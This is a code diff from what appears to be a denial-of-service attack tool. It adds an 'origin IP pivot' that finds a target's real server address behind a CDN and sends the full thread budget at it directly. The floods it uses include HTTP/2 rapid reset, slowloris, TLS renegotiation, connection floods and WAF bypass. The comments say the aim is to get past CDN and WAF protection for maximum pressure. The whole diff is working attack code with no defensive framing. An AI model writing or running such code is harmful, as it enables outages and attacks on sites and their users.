@@ -1151,6 +1151,42 @@ async function runAttackWorkers(
     };
     // Burst mode: deployed only — in dev, extra workers would cause OOM
     if (IS_DEPLOYED) void burstLoop();
+
+    // ── ORIGIN IP PIVOT — runs concurrently with the main 43-vector flood ──
+    // Auto-discovers the real origin IP behind Cloudflare/CDN.
+    // When found: redirects the FULL thread budget (100%) to direct origin attack,
+    // completely bypassing all CDN/WAF filtering. CDN can't protect an IP that
+    // isn't behind it. Main 43-vector attack continues in parallel → maximum pressure.
+    // ──────────────────────────────────────────────────────────────────────────
+    const geassHostname = target.replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];
+    const originPivotTask = (async () => {
+      try {
+        const cdnIPs_g = await dnsP.resolve4(geassHostname).catch(() => [] as string[]);
+        const originIP_g = await _findOriginIPForAttack(geassHostname, cdnIPs_g).catch(() => null);
+        if (originIP_g && !signal.aborted) {
+          console.log(`[geass-override] ✓ ORIGIN PIVOT ATIVADO: ${originIP_g} — redirecionando 100% dos threads para origin direto`);
+          // 100% thread budget → direct origin attack (CDN bypass completely)
+          const oT = threads;
+          const oW = Math.max(6, CPU_COUNT);
+          void Promise.all([
+            // H2 RST + Pipeline first — highest origin server CPU burn
+            spawnPool("h2-rst-burst",   originIP_g, 443, Math.ceil(oT * 0.35), oW,                         signal, onStats, undefined, geassHostname),
+            spawnPool("http-pipeline",  originIP_g, 80,  Math.ceil(oT * 0.35), oW,                         signal, onStats, undefined, geassHostname),
+            spawnPool("waf-bypass",     originIP_g, 443, Math.ceil(oT * 0.30), Math.max(4, Math.floor(CPU_COUNT/2)+2), signal, onStats, undefined, geassHostname),
+            spawnPool("conn-flood",     originIP_g, 443, Math.ceil(oT * 0.20), 1,                                    signal, onStats, undefined, geassHostname),
+            spawnPool("slowloris",      originIP_g, 80,  Math.ceil(oT * 0.20), 1,                                    signal, onStats, undefined, geassHostname),
+            spawnPool("ssl-death",      originIP_g, 443, Math.ceil(oT * 0.15), 2,                                    signal, onStats, undefined, geassHostname),
+            spawnPool("http2-flood",    originIP_g, 443, Math.ceil(oT * 0.25), Math.max(4, CPU_COUNT),               signal, onStats, undefined, geassHostname),
+            spawnPool("http-bypass",    originIP_g, 443, Math.ceil(oT * 0.20), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
+            spawnPool("tls-renego",     originIP_g, 443, Math.ceil(oT * 0.15), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
+          ]).catch(() => {});
+        } else if (!signal.aborted) {
+          console.log(`[geass-override] ✗ Origin IP não encontrado — mantendo ataque CDN completo`);
+        }
+      } catch { /* ignore — origin pivot is best-effort */ }
+    })();
+    void originPivotTask;
+
     await geassPromise;
     return;
   }
